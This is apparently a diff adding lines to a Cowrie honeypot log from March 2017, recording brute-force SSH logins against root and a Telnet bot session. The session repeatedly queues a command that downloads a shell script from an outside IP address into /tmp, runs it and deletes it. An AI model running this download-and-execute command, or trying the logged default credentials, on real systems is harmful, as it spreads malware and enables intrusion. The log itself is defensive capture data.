@@ -4577,3 +4577,283 @@
 2017-03-01T13:22:01+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 78.108.110.48:50720 (10.8.41.81:2222) [session: 110fa21c]
 2017-03-01T13:22:01+0000 [HoneyPotSSHTransport,5358,78.108.110.48] Remote SSH version: SSH-2.0-sshlib-0.1
 2017-03-01T13:22:01+0000 [HoneyPotSSHTransport,5358,78.108.110.48] kex alg, key alg: 'diffie-hellman-group1-sha1' 'ssh-dss'
+2017-03-01T13:22:01+0000 [HoneyPotSSHTransport,5358,78.108.110.48] outgoing: 'aes128-cbc' 'hmac-md5' 'none'
+2017-03-01T13:22:01+0000 [HoneyPotSSHTransport,5358,78.108.110.48] incoming: 'aes128-cbc' 'hmac-md5' 'none'
+2017-03-01T13:22:01+0000 [HoneyPotSSHTransport,5358,78.108.110.48] NEW KEYS
+2017-03-01T13:22:01+0000 [HoneyPotSSHTransport,5358,78.108.110.48] starting service 'ssh-userauth'
+2017-03-01T13:22:01+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5358,78.108.110.48] 'root' trying auth 'password'
+2017-03-01T13:22:02+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5358,78.108.110.48] first time for 78.108.110.48, need: 1
+2017-03-01T13:22:02+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5358,78.108.110.48] login attempt: 1
+2017-03-01T13:22:02+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5358,78.108.110.48] login attempt [root/system] succeeded
+2017-03-01T13:22:04+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5358,78.108.110.48] 'root' authenticated with 'password'
+2017-03-01T13:22:04+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5358,78.108.110.48] starting service 'ssh-connection'
+2017-03-01T13:22:04+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: sh
+2017-03-01T13:22:04+0000 [HoneyPotSSHTransport,5358,78.108.110.48] avatar root logging out
+2017-03-01T13:22:04+0000 [HoneyPotSSHTransport,5358,78.108.110.48] connection lost
+2017-03-01T13:22:04+0000 [HoneyPotSSHTransport,5358,78.108.110.48] Connection lost after 2 seconds
+2017-03-01T13:22:04+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: shell
+2017-03-01T13:22:04+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: cd /tmp; wget http://188.209.52.150/ptx.sh; chmod +x ptx.sh; sh ptx.sh; rm -rf ptx*
+2017-03-01T13:22:05+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 195.22.127.83:46382 (10.8.41.81:2222) [session: 8f117722]
+2017-03-01T13:22:05+0000 [HoneyPotSSHTransport,5359,195.22.127.83] Remote SSH version: SSH-2.0-sshlib-0.2
+2017-03-01T13:22:05+0000 [HoneyPotSSHTransport,5359,195.22.127.83] kex alg, key alg: 'diffie-hellman-group1-sha1' 'ssh-dss'
+2017-03-01T13:22:05+0000 [HoneyPotSSHTransport,5359,195.22.127.83] outgoing: 'aes128-cbc' 'hmac-md5' 'none'
+2017-03-01T13:22:05+0000 [HoneyPotSSHTransport,5359,195.22.127.83] incoming: 'aes128-cbc' 'hmac-md5' 'none'
+2017-03-01T13:22:05+0000 [HoneyPotSSHTransport,5359,195.22.127.83] NEW KEYS
+2017-03-01T13:22:05+0000 [HoneyPotSSHTransport,5359,195.22.127.83] starting service 'ssh-userauth'
+2017-03-01T13:22:05+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: sh
+2017-03-01T13:22:05+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] 'root' trying auth 'password'
+2017-03-01T13:22:06+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt: 2108
+2017-03-01T13:22:06+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login return, expect: [root/welc0me]
+2017-03-01T13:22:07+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt [root/system] failed
+2017-03-01T13:22:07+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: shell
+2017-03-01T13:22:07+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: cd /tmp; wget http://188.209.52.150/ptx.sh; chmod +x ptx.sh; sh ptx.sh; rm -rf ptx*
+2017-03-01T13:22:08+0000 [-] 'root' failed auth 'password'
+2017-03-01T13:22:08+0000 [-] unauthorized login: 
+2017-03-01T13:22:08+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] 'root' trying auth 'password'
+2017-03-01T13:22:08+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt: 2109
+2017-03-01T13:22:08+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login return, expect: [root/welc0me]
+2017-03-01T13:22:09+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt [root/system] failed
+2017-03-01T13:22:09+0000 [CowrieTelnetTransport,22875,187.181.109.17] Closing TTY Log: log/tty/20170301-132024-None-22875i.log after 104 seconds
+2017-03-01T13:22:09+0000 [CowrieTelnetTransport,22875,187.181.109.17] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-03-01T13:22:09+0000 [CowrieTelnetTransport,22875,187.181.109.17] Connection lost after 108 seconds
+2017-03-01T13:22:10+0000 [-] 'root' failed auth 'password'
+2017-03-01T13:22:10+0000 [-] unauthorized login: 
+2017-03-01T13:22:10+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] 'root' trying auth 'password'
+2017-03-01T13:22:10+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt: 2110
+2017-03-01T13:22:10+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login return, expect: [root/welc0me]
+2017-03-01T13:22:11+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt [root/system] failed
+2017-03-01T13:22:11+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: sh
+2017-03-01T13:22:11+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: shell
+2017-03-01T13:22:11+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: cd /tmp; wget http://188.209.52.150/ptx.sh; chmod +x ptx.sh; sh ptx.sh; rm -rf ptx*
+2017-03-01T13:22:12+0000 [-] 'root' failed auth 'password'
+2017-03-01T13:22:12+0000 [-] unauthorized login: 
+2017-03-01T13:22:12+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] 'root' trying auth 'password'
+2017-03-01T13:22:12+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt: 2111
+2017-03-01T13:22:12+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login return, expect: [root/welc0me]
+2017-03-01T13:22:12+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt [root/system] failed
+2017-03-01T13:22:14+0000 [-] 'root' failed auth 'password'
+2017-03-01T13:22:14+0000 [-] unauthorized login: 
+2017-03-01T13:22:14+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] 'root' trying auth 'password'
+2017-03-01T13:22:14+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt: 2112
+2017-03-01T13:22:14+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login return, expect: [root/welc0me]
+2017-03-01T13:22:14+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt [root/system] failed
+2017-03-01T13:22:14+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: sh
+2017-03-01T13:22:14+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: shell
+2017-03-01T13:22:14+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: cd /tmp; wget http://188.209.52.150/ptx.sh; chmod +x ptx.sh; sh ptx.sh; rm -rf ptx*
+2017-03-01T13:22:15+0000 [-] 'root' failed auth 'password'
+2017-03-01T13:22:15+0000 [-] unauthorized login: 
+2017-03-01T13:22:16+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] 'root' trying auth 'password'
+2017-03-01T13:22:16+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt: 2113
+2017-03-01T13:22:16+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login return, expect: [root/welc0me]
+2017-03-01T13:22:16+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt [root/system] failed
+2017-03-01T13:22:16+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: sh
+2017-03-01T13:22:16+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: shell
+2017-03-01T13:22:16+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: cd /tmp; wget http://188.209.52.150/ptx.sh; chmod +x ptx.sh; sh ptx.sh; rm -rf ptx*
+2017-03-01T13:22:17+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 221.194.47.224:48564 (10.8.41.81:2222) [session: 21ada033]
+2017-03-01T13:22:17+0000 [-] 'root' failed auth 'password'
+2017-03-01T13:22:17+0000 [-] unauthorized login: 
+2017-03-01T13:22:17+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] 'root' trying auth 'password'
+2017-03-01T13:22:18+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt: 2114
+2017-03-01T13:22:18+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login return, expect: [root/welc0me]
+2017-03-01T13:22:19+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt [root/system] failed
+2017-03-01T13:22:19+0000 [HoneyPotSSHTransport,5360,221.194.47.224] Remote SSH version: SSH-2.0-PUTTY
+2017-03-01T13:22:19+0000 [HoneyPotSSHTransport,5360,221.194.47.224] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-03-01T13:22:19+0000 [HoneyPotSSHTransport,5360,221.194.47.224] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-03-01T13:22:19+0000 [HoneyPotSSHTransport,5360,221.194.47.224] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-03-01T13:22:20+0000 [-] 'root' failed auth 'password'
+2017-03-01T13:22:20+0000 [-] unauthorized login: 
+2017-03-01T13:22:20+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] 'root' trying auth 'password'
+2017-03-01T13:22:20+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt: 2115
+2017-03-01T13:22:20+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login return, expect: [root/welc0me]
+2017-03-01T13:22:20+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt [root/system] failed
+2017-03-01T13:22:21+0000 [HoneyPotSSHTransport,5360,221.194.47.224] NEW KEYS
+2017-03-01T13:22:21+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: sh
+2017-03-01T13:22:21+0000 [HoneyPotSSHTransport,5360,221.194.47.224] starting service 'ssh-userauth'
+2017-03-01T13:22:21+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: shell
+2017-03-01T13:22:21+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: cd /tmp; wget http://188.209.52.150/ptx.sh; chmod +x ptx.sh; sh ptx.sh; rm -rf ptx*
+2017-03-01T13:22:21+0000 [HoneyPotSSHTransport,5360,221.194.47.224] Got remote error, code 11
+	reason: 
+2017-03-01T13:22:21+0000 [HoneyPotSSHTransport,5360,221.194.47.224] connection lost
+2017-03-01T13:22:21+0000 [HoneyPotSSHTransport,5360,221.194.47.224] Connection lost after 4 seconds
+2017-03-01T13:22:22+0000 [-] 'root' failed auth 'password'
+2017-03-01T13:22:22+0000 [-] unauthorized login: 
+2017-03-01T13:22:22+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] 'root' trying auth 'password'
+2017-03-01T13:22:22+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt: 2116
+2017-03-01T13:22:22+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login return, expect: [root/welc0me]
+2017-03-01T13:22:23+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt [root/system] failed
+2017-03-01T13:22:24+0000 [-] 'root' failed auth 'password'
+2017-03-01T13:22:24+0000 [-] unauthorized login: 
+2017-03-01T13:22:24+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] 'root' trying auth 'password'
+2017-03-01T13:22:24+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt: 2117
+2017-03-01T13:22:24+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login return, expect: [root/welc0me]
+2017-03-01T13:22:25+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt [root/system] failed
+2017-03-01T13:22:25+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: sh
+2017-03-01T13:22:25+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: shell
+2017-03-01T13:22:25+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: cd /tmp; wget http://188.209.52.150/ptx.sh; chmod +x ptx.sh; sh ptx.sh; rm -rf ptx*
+2017-03-01T13:22:26+0000 [-] 'root' failed auth 'password'
+2017-03-01T13:22:26+0000 [-] unauthorized login: 
+2017-03-01T13:22:26+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] 'root' trying auth 'password'
+2017-03-01T13:22:26+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt: 2118
+2017-03-01T13:22:26+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login return, expect: [root/welc0me]
+2017-03-01T13:22:27+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt [root/system] failed
+2017-03-01T13:22:27+0000 [-] Command found: chmod +x ptx.sh
+2017-03-01T13:22:27+0000 [-] Command found: sh ptx.sh
+2017-03-01T13:22:27+0000 [-] Command found: rm -rf ptx*
+2017-03-01T13:22:27+0000 [-] Command found: sh 
+2017-03-01T13:22:27+0000 [-] Command not found: shell
+2017-03-01T13:22:27+0000 [-] Command found: cd /tmp; wget http://188.209.52.150/ptx.sh; chmod +x ptx.sh; sh ptx.sh; rm -rf ptx*
+2017-03-01T13:22:27+0000 [-] Command found: sh 
+2017-03-01T13:22:27+0000 [-] Command not found: shell
+2017-03-01T13:22:27+0000 [-] Command found: cd /tmp; wget http://188.209.52.150/ptx.sh; chmod +x ptx.sh; sh ptx.sh; rm -rf ptx*
+2017-03-01T13:22:27+0000 [-] Command found: sh 
+2017-03-01T13:22:27+0000 [-] Command not found: shell
+2017-03-01T13:22:27+0000 [-] Command found: cd /tmp; wget http://188.209.52.150/ptx.sh; chmod +x ptx.sh; sh ptx.sh; rm -rf ptx*
+2017-03-01T13:22:27+0000 [-] Command found: sh 
+2017-03-01T13:22:27+0000 [-] Command not found: shell
+2017-03-01T13:22:27+0000 [-] Command found: cd /tmp; wget http://188.209.52.150/ptx.sh; chmod +x ptx.sh; sh ptx.sh; rm -rf ptx*
+2017-03-01T13:22:27+0000 [-] Command found: sh 
+2017-03-01T13:22:27+0000 [-] Command not found: shell
+2017-03-01T13:22:27+0000 [-] Command found: cd /tmp; wget http://188.209.52.150/ptx.sh; chmod +x ptx.sh; sh ptx.sh; rm -rf ptx*
+2017-03-01T13:22:27+0000 [-] Command found: sh 
+2017-03-01T13:22:27+0000 [-] Command not found: shell
+2017-03-01T13:22:27+0000 [-] Command found: cd /tmp; wget http://188.209.52.150/ptx.sh; chmod +x ptx.sh; sh ptx.sh; rm -rf ptx*
+2017-03-01T13:22:27+0000 [-] Command found: sh 
+2017-03-01T13:22:27+0000 [-] Command not found: shell
+2017-03-01T13:22:27+0000 [-] Command found: cd /tmp; wget http://188.209.52.150/ptx.sh; chmod +x ptx.sh; sh ptx.sh; rm -rf ptx*
+2017-03-01T13:22:27+0000 [-] Command found: sh 
+2017-03-01T13:22:27+0000 [-] Command not found: shell
+2017-03-01T13:22:27+0000 [-] Command found: cd /tmp; wget http://188.209.52.150/ptx.sh; chmod +x ptx.sh; sh ptx.sh; rm -rf ptx*
+2017-03-01T13:22:27+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://188.209.52.150/ptx.sh>
+2017-03-01T13:22:27+0000 [CowrieTelnetTransport,22290,1.58.200.70] CMD: sh
+2017-03-01T13:22:27+0000 [CowrieTelnetTransport,22290,1.58.200.70] Command found: sh 
+2017-03-01T13:22:27+0000 [CowrieTelnetTransport,22290,1.58.200.70] CMD: shell
+2017-03-01T13:22:27+0000 [CowrieTelnetTransport,22290,1.58.200.70] Command not found: shell
+2017-03-01T13:22:27+0000 [CowrieTelnetTransport,22290,1.58.200.70] CMD: cd /tmp; wget http://188.209.52.150/ptx.sh; chmod +x ptx.sh; sh ptx.sh; rm -rf ptx*
+2017-03-01T13:22:27+0000 [CowrieTelnetTransport,22290,1.58.200.70] Command found: cd /tmp
+2017-03-01T13:22:27+0000 [CowrieTelnetTransport,22290,1.58.200.70] Command found: wget http://188.209.52.150/ptx.sh
+2017-03-01T13:22:27+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://188.209.52.150/ptx.sh>
+2017-03-01T13:22:28+0000 [-] 'root' failed auth 'password'
+2017-03-01T13:22:28+0000 [-] unauthorized login: 
+2017-03-01T13:22:28+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] 'root' trying auth 'password'
+2017-03-01T13:22:28+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt: 2119
+2017-03-01T13:22:28+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login return, expect: [root/welc0me]
+2017-03-01T13:22:29+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt [root/system] failed
+2017-03-01T13:22:30+0000 [-] 'root' failed auth 'password'
+2017-03-01T13:22:30+0000 [-] unauthorized login: 
+2017-03-01T13:22:30+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] 'root' trying auth 'password'
+2017-03-01T13:22:30+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt: 2120
+2017-03-01T13:22:30+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login return, expect: [root/welc0me]
+2017-03-01T13:22:31+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt [root/system] failed
+2017-03-01T13:22:31+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: sh
+2017-03-01T13:22:31+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: shell
+2017-03-01T13:22:31+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: cd /tmp; wget http://188.209.52.150/ptx.sh; chmod +x ptx.sh; sh ptx.sh; rm -rf ptx*
+2017-03-01T13:22:32+0000 [-] 'root' failed auth 'password'
+2017-03-01T13:22:32+0000 [-] unauthorized login: 
+2017-03-01T13:22:32+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] 'root' trying auth 'password'
+2017-03-01T13:22:32+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt: 2121
+2017-03-01T13:22:32+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login return, expect: [root/welc0me]
+2017-03-01T13:22:33+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt [root/system] failed
+2017-03-01T13:22:34+0000 [-] 'root' failed auth 'password'
+2017-03-01T13:22:34+0000 [-] unauthorized login: 
+2017-03-01T13:22:34+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] 'root' trying auth 'password'
+2017-03-01T13:22:34+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt: 2122
+2017-03-01T13:22:34+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login return, expect: [root/welc0me]
+2017-03-01T13:22:35+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt [root/system] failed
+2017-03-01T13:22:35+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: sh
+2017-03-01T13:22:35+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: shell
+2017-03-01T13:22:35+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: cd /tmp; wget http://188.209.52.150/ptx.sh; chmod +x ptx.sh; sh ptx.sh; rm -rf ptx*
+2017-03-01T13:22:36+0000 [-] 'root' failed auth 'password'
+2017-03-01T13:22:36+0000 [-] unauthorized login: 
+2017-03-01T13:22:36+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] 'root' trying auth 'password'
+2017-03-01T13:22:36+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt: 2123
+2017-03-01T13:22:36+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login return, expect: [root/welc0me]
+2017-03-01T13:22:37+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt [root/system] failed
+2017-03-01T13:22:37+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: sh
+2017-03-01T13:22:37+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: shell
+2017-03-01T13:22:37+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: cd /tmp; wget http://188.209.52.150/ptx.sh; chmod +x ptx.sh; sh ptx.sh; rm -rf ptx*
+2017-03-01T13:22:38+0000 [-] 'root' failed auth 'password'
+2017-03-01T13:22:38+0000 [-] unauthorized login: 
+2017-03-01T13:22:38+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] 'root' trying auth 'password'
+2017-03-01T13:22:38+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt: 2124
+2017-03-01T13:22:38+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login return, expect: [root/welc0me]
+2017-03-01T13:22:39+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt [root/system] failed
+2017-03-01T13:22:40+0000 [-] 'root' failed auth 'password'
+2017-03-01T13:22:40+0000 [-] unauthorized login: 
+2017-03-01T13:22:40+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] 'root' trying auth 'password'
+2017-03-01T13:22:40+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt: 2125
+2017-03-01T13:22:40+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login return, expect: [root/welc0me]
+2017-03-01T13:22:41+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt [root/system] failed
+2017-03-01T13:22:41+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: sh
+2017-03-01T13:22:41+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: shell
+2017-03-01T13:22:41+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: cd /tmp; wget http://188.209.52.150/ptx.sh; chmod +x ptx.sh; sh ptx.sh; rm -rf ptx*
+2017-03-01T13:22:42+0000 [-] 'root' failed auth 'password'
+2017-03-01T13:22:42+0000 [-] unauthorized login: 
+2017-03-01T13:22:42+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] 'root' trying auth 'password'
+2017-03-01T13:22:42+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt: 2126
+2017-03-01T13:22:42+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login return, expect: [root/welc0me]
+2017-03-01T13:22:43+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt [root/system] failed
+2017-03-01T13:22:44+0000 [-] 'root' failed auth 'password'
+2017-03-01T13:22:44+0000 [-] unauthorized login: 
+2017-03-01T13:22:44+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] 'root' trying auth 'password'
+2017-03-01T13:22:44+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt: 2127
+2017-03-01T13:22:44+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login return, expect: [root/welc0me]
+2017-03-01T13:22:45+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt [root/system] failed
+2017-03-01T13:22:45+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: sh
+2017-03-01T13:22:45+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: shell
+2017-03-01T13:22:45+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: cd /tmp; wget http://188.209.52.150/ptx.sh; chmod +x ptx.sh; sh ptx.sh; rm -rf ptx*
+2017-03-01T13:22:46+0000 [-] 'root' failed auth 'password'
+2017-03-01T13:22:46+0000 [-] unauthorized login: 
+2017-03-01T13:22:46+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] 'root' trying auth 'password'
+2017-03-01T13:22:46+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt: 2128
+2017-03-01T13:22:46+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login return, expect: [root/welc0me]
+2017-03-01T13:22:47+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,5359,195.22.127.83] login attempt [root/system] failed
+2017-03-01T13:22:47+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: sh
+2017-03-01T13:22:47+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: shell
+2017-03-01T13:22:47+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: cd /tmp; wget http://188.209.52.150/ptx.sh; chmod +x ptx.sh; sh ptx.sh; rm -rf ptx*
+2017-03-01T13:22:48+0000 [-] 'root' failed auth 'password'
+2017-03-01T13:22:48+0000 [-] unauthorized login: 
+2017-03-01T13:22:48+0000 [-] Disconnecting with error, code 14
+	reason: too many bad auths
+2017-03-01T13:22:48+0000 [HoneyPotSSHTransport,5359,195.22.127.83] connection lost
+2017-03-01T13:22:48+0000 [HoneyPotSSHTransport,5359,195.22.127.83] Connection lost after 42 seconds
+2017-03-01T13:22:51+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: sh
+2017-03-01T13:22:51+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: shell
+2017-03-01T13:22:51+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: cd /tmp; wget http://188.209.52.150/ptx.sh; chmod +x ptx.sh; sh ptx.sh; rm -rf ptx*
+2017-03-01T13:22:55+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: sh
+2017-03-01T13:22:55+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: shell
+2017-03-01T13:22:55+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: cd /tmp; wget http://188.209.52.150/ptx.sh; chmod +x ptx.sh; sh ptx.sh; rm -rf ptx*
+2017-03-01T13:22:56+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: sh
+2017-03-01T13:22:57+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: shell
+2017-03-01T13:22:57+0000 [CowrieTelnetTransport,22290,1.58.200.70] QUEUED INPUT: cd /tmp; wget http://188.209.52.150/ptx.sh; chmod +x ptx.sh; sh ptx.sh; rm -rf ptx*
+2017-03-01T13:22:57+0000 [-] Command found: chmod +x ptx.sh
+2017-03-01T13:22:57+0000 [-] Command found: sh ptx.sh
